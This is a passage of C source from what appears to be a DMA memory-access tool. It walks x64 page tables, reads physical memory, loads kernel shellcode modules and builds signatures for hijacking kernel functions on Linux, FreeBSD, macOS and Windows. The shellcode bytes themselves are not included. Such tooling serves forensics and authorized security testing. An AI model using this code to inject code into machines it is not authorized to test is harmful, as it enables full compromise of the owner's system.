    return DeviceReadMEM(qwAddr, 4096, pbPage, TRUE);
}

_Success_(return)
BOOL Util_PageTable_FindSignatureBase_Search(_Inout_opt_ PBYTE pbCache, _In_ QWORD qwCR3, _In_ PSIGNATUREPTE pPTEs, _In_ QWORD cPTEs, _Out_ PQWORD pqwSignatureBase)
{
    // win8  kernel modules start at even  1-page boundaries (0x1000)
    // win10 kernel modules start at even 16-page boundaries (0x10000)
    // winx64 kernel memory is located above 0xfffff80000000000
    BOOL result;
    QWORD PML4[512], PDPT[512], PD[512], PT[512];
    QWORD PML4_idx = 0xfff, PDPT_idx = 0xfff, PD_idx = 0xfff;
    PSIGNATUREPTE pPTE = pPTEs;
    QWORD cPTE = 0, cPTEPages = 0, PTE, qwA;
    QWORD qwPageTableData;
    WORD wSignature;
    result = Util_PageTable_FindSignatureBase_CachedReadMEM(qwCR3 & 0x0000fffffffff000, (PBYTE)PML4, pbCache);
    if(!result) { return FALSE; }
    qwA = 0x0fffff80000000000;
    while(qwA > 0x07fffffffffffffff) {
        if(PML4_idx != (0x1ff & (qwA >> 39))) { // PML4
            PML4_idx = 0x1ff & (qwA >> 39);
            qwPageTableData = PML4[PML4_idx];
            if(!Util_PageTable_FindSignatureBase_IsPageTableDataValid(qwPageTableData)) {
                qwA += 0x0000008000000000;
                qwA &= 0xffffff8000000000;
                continue;
            }
            result = Util_PageTable_FindSignatureBase_CachedReadMEM(qwPageTableData & 0x0000fffffffff000, (PBYTE)PDPT, pbCache);
            if(!result) {
                qwA += 0x0000008000000000;
                qwA &= 0xffffff8000000000;
                continue;
            }
            PDPT_idx = 0xfff;
            PD_idx = 0xfff;
        }
        if(PDPT_idx != (0x1ff & (qwA >> 30))) { // PDPT(Page-Directory Pointer Table)
            PDPT_idx = 0x1ff & (qwA >> 30);
            qwPageTableData = PDPT[PDPT_idx];
            if(!Util_PageTable_FindSignatureBase_IsPageTableDataValid(qwPageTableData)) {
                qwA += 0x0000000040000000;
                qwA &= 0xffffffffC0000000;
                continue;
            }
            result = Util_PageTable_FindSignatureBase_CachedReadMEM(qwPageTableData & 0x0000fffffffff000, (PBYTE)PD, pbCache);
            if(!result) {
                qwA += 0x0000000040000000;
                qwA &= 0xffffffffC0000000;
                continue;
            }
            PD_idx = 0xfff;
        }
        if(PD_idx != (0x1ff & (qwA >> 21))) { // PD (Page Directory)
            PD_idx = 0x1ff & (qwA >> 21);
            qwPageTableData = PD[PD_idx];
            if(!Util_PageTable_FindSignatureBase_IsPageTableDataValid(qwPageTableData)) {
                qwA += 0x0000000000200000;
                qwA &= 0xffffffffffE00000;
                continue;
            }
            result = Util_PageTable_FindSignatureBase_CachedReadMEM(qwPageTableData & 0x0000fffffffff000, (PBYTE)PT, pbCache);
            if(!result) {
                qwA += 0x0000000000200000;
                qwA &= 0xffffffffffE00000;
                continue;
            }
        }
        PTE = PT[0x1ff & (qwA >> 12)];
        wSignature = (PTE & 0x07) | ((PTE >> 48) & 0x8000);
        if(wSignature != pPTE->wSignature) { // signature do not match
            qwA += 0x0000000000001000;
            qwA &= 0xfffffffffffff000;
            pPTE = pPTEs;
            cPTE = 0;
            cPTEPages = 0;
            continue;
        }
        if(cPTE == 0 && cPTEPages == 0) {
            *pqwSignatureBase = qwA;
        }
        cPTEPages++;
        if(cPTEPages == pPTE->cPages) { // next page section
            cPTE++;
            pPTE = pPTEs + cPTE;
            cPTEPages = 0;
            if(pPTE->cPages == 0 || cPTE == cPTEs) { // found
                return TRUE;
            }
        }
        qwA += 0x1000;
    }
    *pqwSignatureBase = 0;
    return FALSE;
}

_Success_(return)
BOOL Util_PageTable_Virtual2Physical(_In_ QWORD qwCR3, _In_ QWORD qwVA, _Out_ PQWORD pqwPA, _Out_ PQWORD pqwPageBase, _Out_ PQWORD pqwPageSize)
{
    BOOL result;
    QWORD pqwPTE, qwPTEPA, qwPgLvl;
    result = Util_PageTable_Helper(qwVA, 4, qwCR3, 0, 0, 0, &pqwPTE, &qwPTEPA, &qwPgLvl);
    if(result && (qwPgLvl == 1)) {
        *pqwPageSize = 0x1000;
        *pqwPageBase = pqwPTE & 0x0000fffffffff000;
        *pqwPA = *pqwPageBase + (qwVA % *pqwPageSize);
        return TRUE;
    }
    if(result && (qwPgLvl == 2)) {
        *pqwPageSize = 0x200000;
        *pqwPageBase = pqwPTE & 0x0000ffffffe00000;
        *pqwPA = *pqwPageBase + (qwVA % *pqwPageSize);
        return TRUE;
    }
    return FALSE;
}

_Success_(return)
BOOL Util_PageTable_WindowsHintPML4(_Out_ PQWORD pqwCR3)
{
    BYTE pb[0x1000];
    return
        DeviceReadMEM(0x1000, 0x1000, pb, FALSE) &&
        ((*(PQWORD)(pb + 0x78) & 0xfffffffffff00fff) == 0xffffffffffd00000) &&
        ((*(PQWORD)(pb + 0xa0) & 0xffffffff00000fff) == 0) &&
        (*pqwCR3 = *(PQWORD)(pb + 0xa0));
    return FALSE;
}

_Success_(return)
BOOL Util_PageTable_FindSignatureBase(_Inout_ PQWORD pqwCR3, _In_ PSIGNATUREPTE pPTEs, _In_ QWORD cPTEs, _Out_ PQWORD pqwSignatureBase)
{
    BOOL result;
    QWORD qwRegCR3;
    PBYTE pbCache;
    // if page base (CR3) is specified -> use it.
    if(!ctxMain->cfg.fPageTableScan) {
        return Util_PageTable_FindSignatureBase_Search(NULL, *pqwCR3, pPTEs, cPTEs, pqwSignatureBase);
    }
    // try CR3/PML4 hint at PA 0x1000 on windows 8.1/10.
    result =
        Util_PageTable_WindowsHintPML4(pqwCR3) &&
        Util_PageTable_FindSignatureBase_Search(NULL, *pqwCR3, pPTEs, cPTEs, pqwSignatureBase);
    if(result) { return TRUE; }
    // page table scan guessing common CR3 base addresses.
    pbCache = LocalAlloc(LMEM_ZEROINIT, 0x01000000);
    for(qwRegCR3 = 0x100000; qwRegCR3 < 0x1000000; qwRegCR3 += 0x1000) {
        if(Util_PageTable_FindSignatureBase_Search(pbCache, qwRegCR3, pPTEs, cPTEs, pqwSignatureBase)) {
            *pqwCR3 = qwRegCR3;
            LocalFree(pbCache);
            return TRUE;
        }
    }
    LocalFree(pbCache);
    return FALSE;
}

_Success_(return)
BOOL Util_PageTable_FindMappedAddress(_In_ QWORD qwCR3, _In_ QWORD qwAddrPhys, _Out_ PQWORD pqwAddrVirt, _Out_opt_ PQWORD pqwPTE, _Out_opt_ PQWORD pqwPDE, _Out_opt_ PQWORD pqwPDPTE, _Out_opt_ PQWORD pqwPML4E)
{
    BOOL result, fFirstRun;
    QWORD PML4[512], PDPT[512], PD[512], PT[512];
    QWORD PML4_idx = 0xfff, PDPT_idx = 0xfff, PD_idx = 0xfff, PT_idx = 0xfff;
    QWORD qwA;
    QWORD qwPageTableData;
    result = DeviceReadMEM(qwCR3 & 0x0000fffffffff000, 0x1000, (PBYTE)PML4, TRUE);
    if(!result) { return FALSE; }
    qwA = 0;
    fFirstRun = TRUE;
    while(qwA || fFirstRun) {
        fFirstRun = FALSE;
        if(qwA & 0xffff800000000000) {
            qwA |= 0xffff800000000000;
        }
        if(PML4_idx != (0x1ff & (qwA >> 39))) { // PML4
            PML4_idx = 0x1ff & (qwA >> 39);
            qwPageTableData = PML4[PML4_idx];
            if((qwPageTableData & 0x81) != 0x01) {
                qwA = (qwA + 0x0000008000000000) & 0xffffff8000000000;
                continue;
            }
            result = DeviceReadMEM(qwPageTableData & 0x0000fffffffff000, 0x1000, (PBYTE)PDPT, FALSE);
            if(!result) {
                qwA = (qwA + 0x0000008000000000) & 0xffffff8000000000;
                continue;
            }
            PDPT_idx = 0xfff;
            PD_idx = 0xfff;
            PT_idx = 0xfff;
        }
        if(PDPT_idx != (0x1ff & (qwA >> 30))) { // PDPT(Page-Directory Pointer Table)
            PDPT_idx = 0x1ff & (qwA >> 30);
            qwPageTableData = PDPT[PDPT_idx];
            if((qwPageTableData & 0x81) != 0x01) {
                qwA = (qwA + 0x0000000040000000) & 0xffffffffC0000000;
                continue;
            }
            result = DeviceReadMEM(qwPageTableData & 0x0000fffffffff000, 0x1000, (PBYTE)PD, FALSE);
            if(!result) {
                qwA = (qwA + 0x0000000040000000) & 0xffffffffC0000000;
                continue;
            }
            PD_idx = 0xfff;
            PT_idx = 0xfff;
        }
        if(PD_idx != (0x1ff & (qwA >> 21))) { // PD (Page Directory)
            PD_idx = 0x1ff & (qwA >> 21);
            qwPageTableData = PD[PD_idx];
            if(((qwPageTableData & 0x81) == 0x81) && ((qwPageTableData & 0x0000ffffffe00000) == (qwAddrPhys & 0x0000ffffffe00000))) { // map 2MB page
                *pqwAddrVirt = qwA + (qwAddrPhys & 0x1fffff);
                if(pqwPTE) { *pqwPTE = PD[PD_idx]; }
                if(pqwPDE) { *pqwPDE = PD[PD_idx]; }
                if(pqwPDPTE) { *pqwPDPTE = PDPT[PDPT_idx]; }
                if(pqwPML4E) { *pqwPML4E = PML4[PML4_idx]; }
                return TRUE;
            }
            if((qwPageTableData & 0x81) != 0x01) {
                qwA = (qwA + 0x0000000000200000) & 0xffffffffffE00000;
                continue;
            }
            result = DeviceReadMEM(qwPageTableData & 0x0000fffffffff000, 0x1000, (PBYTE)PT, FALSE);
            if(!result) {
                qwA = (qwA + 0x0000000000200000) & 0xffffffffffE00000;
                continue;
            }
            PT_idx = 0xfff;
        }
        if(PT_idx != (0x1ff & (qwA >> 12))) { // PT (Page Table)
            PT_idx = 0x1ff & (qwA >> 12);
            qwPageTableData = PT[PT_idx];
            if(((qwPageTableData & 0x01) == 0x01) && ((qwPageTableData & 0x0000fffffffff000) == (qwAddrPhys & 0x0000fffffffff000))) {
                *pqwAddrVirt = qwA + (qwAddrPhys & 0xfff);
                if(pqwPTE) { *pqwPTE = PT[PT_idx]; }
                if(pqwPDE) { *pqwPDE = PD[PD_idx]; }
                if(pqwPDPTE) { *pqwPDPTE = PDPT[PDPT_idx]; }
                if(pqwPML4E) { *pqwPML4E = PML4[PML4_idx]; }
                return TRUE;
            }
            qwA = (qwA + 0x0000000000001000) & 0xfffffffffffff000;
            continue;
        }
    }
    return FALSE;
}

BOOL Util_HexAsciiToBinary(_In_ LPSTR sz, _Out_ PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcb)
{
    SIZE_T i, csz = strlen(sz);
    ZeroMemory(pb, cb);
    *pcb = (DWORD)(csz >> 1);
    if((csz % 2) || (cb < *pcb)) { return FALSE; }
    for(i = 0; i < *pcb; i++) {
        if(!sscanf_s(sz + (i << 1), "%02x", (PDWORD)(pb + i))) { return FALSE; }
    }
    return TRUE;
}

DWORD Util_GetFileSize(_In_ LPSTR sz)
{
    FILE *pFile;
    DWORD size;
    if(fopen_s(&pFile, sz, "rb") || !pFile) { return 0; }
    fseek(pFile, 0, SEEK_END); // seek to end of file
    size = ftell(pFile); // get current file pointer
    fclose(pFile);
    return size;
}

_Success_(return)
BOOL Util_ParseHexFileBuiltin(_In_ LPSTR sz, _Out_writes_(*pcb) PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcb)
{
    SIZE_T i;
    FILE *pFile;
    BOOL result;
    // 1: try load default
    if(0 == memcmp("DEFAULT", sz, 7)) {
        for(i = 0; i < (sizeof(SHELLCODE_DEFAULT) / sizeof(SHELLCODE_DEFAULT_STRUCT)); i++) {
            if((0 == strcmp(SHELLCODE_DEFAULT[i].sz, sz)) && (SHELLCODE_DEFAULT[i].cb <= cb)) {       
                memcpy(pb, SHELLCODE_DEFAULT[i].pb, SHELLCODE_DEFAULT[i].cb);
                *pcb = SHELLCODE_DEFAULT[i].cb;
                return TRUE;
            }
        }
        return FALSE;
    }
    // 2: try load hex ascii
    if(Util_HexAsciiToBinary(sz, pb, cb, pcb)) {
        return TRUE;
    }
    if(0 == memcmp("-", sz, 2)) {
        *pcb = 0;
        return TRUE;
    }
    // 3: try load file
    i = strnlen_s(sz, MAX_PATH);
    if(i > 4 && i < MAX_PATH) { // try to load from file
        if(fopen_s(&pFile, sz, "rb") || !pFile) { return FALSE; }
        *pcb = (DWORD)fread(pb, 1, cb, pFile);
        result = (0 != feof(pFile));
        fclose(pFile);
        return result;
    }
    return FALSE;
}

BOOL Util_ParseSignatureLine(_In_ PSTR szLine, _In_ DWORD cSignatureChunks, _Out_ PSIGNATURE_CHUNK pSignatureChunks) {
    LPSTR szToken, szContext = NULL;
    PSIGNATURE_CHUNK pChunk;
    DWORD i;
    BOOL result;
    if(!szLine || !strlen(szLine) || szLine[0] == '#') { return FALSE; }
    for(i = 0; i < cSignatureChunks * 2; i++) {
        pChunk = &pSignatureChunks[i / 2];
        szToken = strtok_s(szLine, ",:;", &szContext);
        szLine = NULL;
        if(!szToken) { return FALSE; }
        if(i % 2 == 0) {
            if(szToken[0] == '*') {
                pChunk->tpOffset = SIGNATURE_CHUNK_TP_OFFSET_ANY;
            } else {
                if(szToken[0] == 'r') {
                    pChunk->tpOffset = SIGNATURE_CHUNK_TP_OFFSET_RELATIVE;
                    szToken = &szToken[1];
                }
                pChunk->cbOffset = strtoul(szToken, NULL, 16);
            }
        } else {
            result = Util_ParseHexFileBuiltin(szToken, pChunk->pb, sizeof(pChunk->pb), &pChunk->cb);
            if(!result) { return FALSE; }
        }
    }
    return TRUE;
}

_Success_(return)
BOOL Util_LoadSignatures(_In_ LPSTR szSignatureName, _In_ LPSTR szFileExtension, _Out_ PSIGNATURE pSignatures, _Inout_ PDWORD cSignatures, _In_ DWORD cSignatureChunks)
{
    PBYTE pbFile;
    DWORD cbFile = 0, cSignatureIdx = 0;
    CHAR szSignatureFile[MAX_PATH];
    FILE *pFile;
    LPSTR szContext = NULL, szLine;
    pbFile = LocalAlloc(LMEM_ZEROINIT, 0x10000);
    if(!pbFile) { goto fail; }
    memset(pSignatures, 0, *cSignatures * sizeof(SIGNATURE));
    // open and read file
    Util_GetFileInDirectory(szSignatureFile, szSignatureName);
    if(_strnicmp(szSignatureFile + strlen(szSignatureFile) - strlen(szFileExtension), szFileExtension, MAX_PATH)) { // add extension if missing
        strcpy_s(szSignatureFile + strlen(szSignatureFile), MAX_PATH - strlen(szSignatureFile), szFileExtension);
    }
    if(fopen_s(&pFile, szSignatureFile, "rb") || !pFile) { goto fail; }
    memset(pbFile, 0, 0x10000);
    cbFile = (DWORD)fread(pbFile, 1, 0x10000, pFile);
    fclose(pFile);
    if(!cbFile || cbFile == 0x10000) { goto fail; }
    // parse file
    szLine = strtok_s((char*)pbFile, "\r\n", &szContext);
    while(szLine && cSignatureIdx < *cSignatures) {
        if(Util_ParseSignatureLine(szLine, cSignatureChunks, pSignatures[cSignatureIdx].chunk)) {
            cSignatureIdx++;
        }
        szLine = strtok_s(NULL, "\r\n", &szContext);
    }
    *cSignatures = cSignatureIdx;
    LocalFree(pbFile);
    return (cSignatureIdx > 0);
fail:
    LocalFree(pbFile);
    return FALSE;
}

VOID Util_GetFileInDirectory(_Out_writes_(MAX_PATH) LPSTR szPath, _In_ LPSTR szFileName)
{
    SIZE_T i, cchFileName = strlen(szFileName);
    ZeroMemory(szPath, MAX_PATH);
    GetModuleFileNameA(NULL, (LPSTR)szPath, (DWORD)(MAX_PATH - cchFileName - 4));
    for(i = strlen(szPath) - 1; i > 0; i--) {
        if(szPath[i] == '/' || szPath[i] == '\\') {
            strcpy_s(&szPath[i + 1], MAX_PATH - i - 5, szFileName);
            return;
        }
    }
}

DWORD Util_memcmpEx(_In_ PBYTE pb1, _In_ PBYTE pb2, _In_  DWORD cb)
{
    DWORD i;
    for(i = 0; i < cb; i++) {
        if(pb1[i] != pb2[i]) {
            return i + 1;
        }
    }
    return 0;
}

VOID Util_GenRandom(_Out_ PBYTE pb, _In_ DWORD cb)
{
    DWORD i = 0;
    srand((unsigned int)GetTickCount64());
    if(cb % 2) {
        *(PBYTE)(pb) = (BYTE)rand();
        i++;
    }
    for(;i <= cb - 2; i += 2) {
        *(PWORD)(pb + i) = (WORD)rand();
    }
}

#define KMD_EXEC_MAX_SHELLCODE_SIZE        0x80000

_Success_(return)
BOOL Util_LoadKmdExecShellcode(_In_ LPSTR szKmdExecName, _Out_ PKMDEXEC* ppKmdExec)
{
    CHAR szKmdExecFile[MAX_PATH];
    PBYTE pbKmdExec;
    DWORD cbKmdExec = 0, i;
    PKMDEXEC pKmdExec;
    FILE *pFile;
    pbKmdExec = (PBYTE)LocalAlloc(LMEM_ZEROINIT, KMD_EXEC_MAX_SHELLCODE_SIZE);
    if(!pbKmdExec) { return FALSE; }
    // open and read file
    if(0 == memcmp("DEFAULT", szKmdExecName, 7)) {
        for(i = 0; i < (sizeof(SHELLCODE_DEFAULT) / sizeof(SHELLCODE_DEFAULT_STRUCT)); i++) {
            if((0 == strcmp(SHELLCODE_DEFAULT[i].sz, szKmdExecName)) && (SHELLCODE_DEFAULT[i].cb <= KMD_EXEC_MAX_SHELLCODE_SIZE)) {
                memcpy(pbKmdExec, SHELLCODE_DEFAULT[i].pb, SHELLCODE_DEFAULT[i].cb);
                cbKmdExec = SHELLCODE_DEFAULT[i].cb;
                break;
            }
        }
    }
    if(0 == cbKmdExec) {
        Util_GetFileInDirectory(szKmdExecFile, szKmdExecName);
        strcpy_s(szKmdExecFile + strlen(szKmdExecFile), MAX_PATH - strlen(szKmdExecFile), ".ksh");
        if(fopen_s(&pFile, szKmdExecFile, "rb") || !pFile) { return FALSE; }
        cbKmdExec = (DWORD)fread(pbKmdExec, 1, KMD_EXEC_MAX_SHELLCODE_SIZE, pFile);
        fclose(pFile);
        if(cbKmdExec < sizeof(KMDEXEC)) { goto error; }
    }
    // ensure file validity
    pKmdExec = (PKMDEXEC)pbKmdExec;
    if(pKmdExec->dwMagic != KMDEXEC_MAGIC) { goto error; }
    // INFO: TODO: SHA256 integrity validation temporarily removed due to linux port.
    // parse file
    pKmdExec->cbShellcode = (pKmdExec->cbShellcode + 0xfff) & 0xfffff000; // align to 4k (otherwise dma write may fail)
    pKmdExec->szOutFormatPrintf = (LPSTR)((QWORD)pKmdExec + (QWORD)pKmdExec->szOutFormatPrintf);
    pKmdExec->pbShellcode = (PBYTE)((QWORD)pKmdExec + (QWORD)pKmdExec->pbShellcode);
    *ppKmdExec = pKmdExec;
    return TRUE;
error:
    LocalFree(pbKmdExec);
    pKmdExec = NULL;
    return FALSE;
}

QWORD Util_GetNumeric(_In_ LPSTR sz)
{
    if((strlen(sz) > 1) && (sz[0] == '0') && ((sz[1] == 'x') || (sz[1] == 'X'))) {
        return strtoull(sz, NULL, 16); // Hex (starts with 0x)
    } else {
        return strtoull(sz, NULL, 10); // Not Hex -> try Decimal
    }
}

VOID Util_CreateSignatureLinuxGeneric(_In_ QWORD paBase, 
    _In_ DWORD paSzKallsyms, _In_ QWORD vaSzKallsyms, _In_ QWORD vaFnKallsyms,
    _In_ DWORD paSzFnHijack, _In_ QWORD vaSzFnHijack, _In_ QWORD vaFnHijack, _Out_ PSIGNATURE pSignature)
{
    DWORD dwBaseKallsyms2M = (paSzKallsyms & ~0x1fffff) - ((vaSzKallsyms & ~0x1fffff) - (vaFnKallsyms & ~0x1fffff));    // symbol name base is not same as fn base
    DWORD dwBaseFnHijack2M = (paSzFnHijack & ~0x1fffff) - ((vaSzFnHijack & ~0x1fffff) - (vaFnHijack & ~0x1fffff));      // symbol name base is not same as fn base
    memset(pSignature, 0, sizeof(SIGNATURE));
    Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE1", pSignature->chunk[2].pb, 4096, &pSignature->chunk[2].cb);
    Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE2", pSignature->chunk[3].pb, 4096, &pSignature->chunk[3].cb);
    Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE3", pSignature->chunk[4].pb, 4096, &pSignature->chunk[4].cb);
    pSignature->chunk[2].cbOffset = (DWORD)(dwBaseFnHijack2M + (vaFnHijack & 0x1fffff));
    pSignature->chunk[3].cbOffset = 0xd00;
    pSignature->chunk[4].cbOffset = (DWORD)(dwBaseKallsyms2M + (vaFnKallsyms & 0x1fffff));
    pSignature->chunk[0].qwAddress = paBase + dwBaseFnHijack2M + (vaFnHijack & 0x1ff000);
    pSignature->chunk[1].qwAddress = paBase;
}

VOID Util_CreateSignatureFreeBSDGeneric(_In_ DWORD paStrTab, _In_ DWORD paFnHijack, _Out_ PSIGNATURE pSignature)
{
    memset(pSignature, 0, sizeof(SIGNATURE));
    Util_ParseHexFileBuiltin("DEFAULT_FREEBSD_X64_STAGE1", pSignature->chunk[2].pb, 4096, &pSignature->chunk[2].cb);
    Util_ParseHexFileBuiltin("DEFAULT_FREEBSD_X64_STAGE2", pSignature->chunk[3].pb, 4096, &pSignature->chunk[3].cb);
    Util_ParseHexFileBuiltin("DEFAULT_FREEBSD_X64_STAGE3", pSignature->chunk[4].pb, 4096, &pSignature->chunk[4].cb);
    pSignature->chunk[0].cbOffset = paFnHijack;
    pSignature->chunk[1].cbOffset = 0x1e00;
    pSignature->chunk[2].cbOffset = paFnHijack;
    pSignature->chunk[3].cbOffset = 0x1e00;
    pSignature->chunk[4].cbOffset = paStrTab;
    pSignature->chunk[0].qwAddress = pSignature->chunk[0].cbOffset & ~0xfff;
    pSignature->chunk[1].qwAddress = pSignature->chunk[1].cbOffset & ~0xfff;
}

VOID Util_CreateSignatureMacOSGeneric(_In_ DWORD paKernelBase, _In_ DWORD paFunctionHook, _In_ DWORD paStage2, _Out_ PSIGNATURE pSignature)
{
    memset(pSignature, 0, sizeof(SIGNATURE));
    Util_ParseHexFileBuiltin("DEFAULT_MACOS_STAGE1", pSignature->chunk[2].pb, 4096, &pSignature->chunk[2].cb);
    Util_ParseHexFileBuiltin("DEFAULT_MACOS_STAGE2", pSignature->chunk[3].pb, 4096, &pSignature->chunk[3].cb);
    Util_ParseHexFileBuiltin("DEFAULT_MACOS_STAGE3", pSignature->chunk[4].pb, 4096, &pSignature->chunk[4].cb);
    pSignature->chunk[0].cbOffset = paFunctionHook;
    pSignature->chunk[1].cbOffset = paStage2;
    pSignature->chunk[2].cbOffset = paFunctionHook;
    pSignature->chunk[3].cbOffset = paStage2;
    pSignature->chunk[4].cbOffset = paKernelBase;
    pSignature->chunk[0].qwAddress = pSignature->chunk[0].cbOffset & ~0xfff;
    pSignature->chunk[1].qwAddress = pSignature->chunk[1].cbOffset & ~0xfff;
}

VOID Util_CreateSignatureWindowsHalGeneric(_Out_ PSIGNATURE pSignature)
{
    memset(pSignature, 0, sizeof(SIGNATURE));
    Util_ParseHexFileBuiltin("DEFAULT_WINX64_STAGE2_HAL", pSignature->chunk[3].pb, 4096, &pSignature->chunk[3].cb);
    Util_ParseHexFileBuiltin("DEFAULT_WINX64_STAGE3", pSignature->chunk[4].pb, 4096, &pSignature->chunk[4].cb);
}

VOID Util_CreateSignatureLinuxEfiRuntimeServices(_Out_ PSIGNATURE pSignature)
{
    memset(pSignature, 0, sizeof(SIGNATURE));
    Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE2_EFI", pSignature->chunk[3].pb, 4096, &pSignature->chunk[3].cb);
    Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE3", pSignature->chunk[4].pb, 4096, &pSignature->chunk[4].cb);
}

VOID Util_CreateSignatureSearchAll(_In_ PBYTE pb, _In_ DWORD cb, _Out_ PSIGNATURE pSignature)
{
    memset(pSignature, 0, sizeof(SIGNATURE));
    pSignature->chunk[0].tpOffset = SIGNATURE_CHUNK_TP_OFFSET_ANY;
    pSignature->chunk[0].cb = cb < 0x1000 ? cb : 0x1000;
    pSignature->chunk[2].tpOffset = SIGNATURE_CHUNK_TP_OFFSET_RELATIVE;
    memcpy(pSignature->chunk[0].pb, pb, pSignature->chunk[0].cb);
}

VOID Util_Read1M(_Out_writes_(0x00100000) PBYTE pbBuffer1M, _In_ QWORD qwBaseAddress, _Inout_opt_ PPAGE_STATISTICS pPageStat)
{
    QWORD o, p;
    // try read 1M in 128k chunks
    for(o = 0; o < 0x00100000; o += 0x00020000) {
        if((qwBaseAddress + o + 0x00020000 <= ctxMain->cfg.paAddrMax) && DeviceReadMEM(qwBaseAddress + o, 0x00020000, pbBuffer1M + o, FALSE)) {
            PageStatUpdate(pPageStat, qwBaseAddress + o + 0x00020000, 32, 0);
        } else {
            // try read 128k in 4k (page) chunks
            for(p = 0; p < 0x00020000; p += 0x1000) {
                if(!(qwBaseAddress + o + p + 0x1000 <= ctxMain->cfg.paAddrMax)) {
                    return;
                }
                if((qwBaseAddress + o + p + 0x1000 <= ctxMain->cfg.paAddrMax) && DeviceReadMEM(qwBaseAddress + o + p, 0x1000, pbBuffer1M + o + p, FALSE)) {
                    PageStatUpdate(pPageStat, qwBaseAddress + o + p + 0x1000, 1, 0);
                } else {
                    PageStatUpdate(pPageStat, qwBaseAddress + o + p + 0x1000, 0, 1);
                }
            }
        }
    }
}

_Success_(return)
BOOL Util_Read16M(_Out_writes_(0x01000000) PBYTE pbBuffer16M, _In_ QWORD qwBaseAddress, _In_opt_ PPAGE_STATISTICS pPageStat)
{
    BOOL isSuccess[4] = { FALSE, FALSE, FALSE, FALSE };
    QWORD i, o, qwOffset, cbRead;
    if(qwBaseAddress >= ctxMain->cfg.paAddrMax) { return FALSE; }
    if(!ctxMain->phKMD) { // Native DMA
        cbRead = min(0x01000000, ctxMain->cfg.paAddrMax - qwBaseAddress);
        return 0 != DeviceReadDMA(qwBaseAddress, (DWORD)cbRead, pbBuffer16M, pPageStat);
    }
    // try read 16M
    if((qwBaseAddress + 0x01000000 <= ctxMain->cfg.paAddrMax) && DeviceReadMEM(qwBaseAddress, 0x01000000, pbBuffer16M, FALSE)) {
        PageStatUpdate(pPageStat, qwBaseAddress + 0x01000000, 4096, 0);
        return TRUE;
    }
    // try read 16M in 4M chunks
    memset(pbBuffer16M, 0, 0x01000000);
    for(i = 0; i < 4; i++) {
        o = 0x00400000 * i;
        isSuccess[i] = (qwBaseAddress + o + 0x00400000 <= ctxMain->cfg.paAddrMax) && DeviceReadMEM(qwBaseAddress + o, 0x00400000, pbBuffer16M + o, FALSE);
    }
    // try read failed chunks.
    for(i = 0; i < 4; i++) {
        if(isSuccess[i]) {
            PageStatUpdate(pPageStat, qwBaseAddress + (i + 1) * 0x00400000, 1024, 0);
        } else {
            qwOffset = 0x00400000 * i;
            for(o = 0; o < 0x00400000; o += 0x00100000) {
                Util_Read1M(pbBuffer16M + qwOffset + o, qwBaseAddress + qwOffset + o, pPageStat);
            }
        }
    }
    return TRUE;
}

VOID Util_WaitForPowerOn()
{
    BYTE pbDummy[4096];
    while(TRUE) {
        if(DeviceOpen()) {
            if(LcRead(ctxMain->hLC, 0x01000000, 0x1000, pbDummy)) {
                break;
            }
            LcClose(ctxMain->hLC);
        }
        Sleep(100);
    }
}

VOID Util_WaitForPowerCycle()
{
    LcClose(ctxMain->hLC);
    while(DeviceOpen()) {
        LcClose(ctxMain->hLC);
        Sleep(100);
    }
    Util_WaitForPowerOn();
}

#define Util_2HexChar(x) (((((x) & 0xf) <= 9) ? '0' : ('a' - 10)) + ((x) & 0xf))

#define UTIL_PRINTASCII \
    "................................ !\"#$%&'()*+,-./0123456789:;<=>?" \
    "@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ " \
    "................................................................" \
    "................................................................" \

_Success_(return)
BOOL Util_FillHexAscii(_In_opt_ PBYTE pb, _In_ DWORD cb, _In_ DWORD cbInitialOffset, _Out_opt_ LPSTR sz, _Inout_ PDWORD pcsz)
{
    DWORD i, j, o = 0, iMod, cRows;
    // checks
    if((cbInitialOffset > cb) || (cbInitialOffset > 0x1000) || (cbInitialOffset & 0xf)) { return FALSE; }
    cRows = (cb + 0xf) >> 4;
    if(!sz) {
        *pcsz = 1 + cRows * 76;
        return TRUE;
    }
    if(!pb || (*pcsz <= cRows * 76)) { return FALSE; }
    // fill buffer with bytes
    for(i = cbInitialOffset; i < cb + ((cb % 16) ? (16 - cb % 16) : 0); i++)
    {
        // address
        if(0 == i % 16) {
            iMod = i % 0x10000;
            sz[o++] = Util_2HexChar(iMod >> 12);
            sz[o++] = Util_2HexChar(iMod >> 8);
            sz[o++] = Util_2HexChar(iMod >> 4);
            sz[o++] = Util_2HexChar(iMod);
            sz[o++] = ' ';
            sz[o++] = ' ';
            sz[o++] = ' ';
            sz[o++] = ' ';
        } else if(0 == i % 8) {
            sz[o++] = ' ';
        }
        // hex
        if(i < cb) {
            sz[o++] = Util_2HexChar(pb[i] >> 4);
            sz[o++] = Util_2HexChar(pb[i]);
            sz[o++] = ' ';
        } else {
            sz[o++] = ' ';
            sz[o++] = ' ';
            sz[o++] = ' ';
        }
        // ascii
        if(15 == i % 16) {
            sz[o++] = ' ';
            sz[o++] = ' ';
            for(j = i - 15; j <= i; j++) {
                if(j >= cb) {
                    sz[o++] = ' ';
                } else {
                    sz[o++] = UTIL_PRINTASCII[pb[j]];
                }
            }
            sz[o++] = '\n';
        }
    }
    sz[o] = 0;
    *pcsz = o;
    return TRUE;
}

VOID Util_PrintHexAscii(_In_ PBYTE pb, _In_ DWORD cb, _In_ DWORD cbInitialOffset)
{
    DWORD szMax = 0;
    LPSTR sz;
    if(cb > 0x10000) {
        printf("Large output. Only displaying first 65kB.\n");
        cb = 0x10000 - cbInitialOffset;
    }
    Util_FillHexAscii(pb, cb, cbInitialOffset, NULL, &szMax);
    if(!(sz = LocalAlloc(0, szMax))) { return; }
    Util_FillHexAscii(pb, cb, cbInitialOffset, sz, &szMax);
    printf("%s", sz);
    LocalFree(sz);
}

#define UTIL_PRINTABLE_CHARACTERS_MAP "" \
    "0000000001100100000000000000000011111111111111111111111111111111" \
    "1111111111111111111111111111111111111111111111111111111111111110" \
    "1111111111111111111111111111111111111111111111111111111111111111" \
    "1111111111111111111111111111111111111111111111111111111111111110"

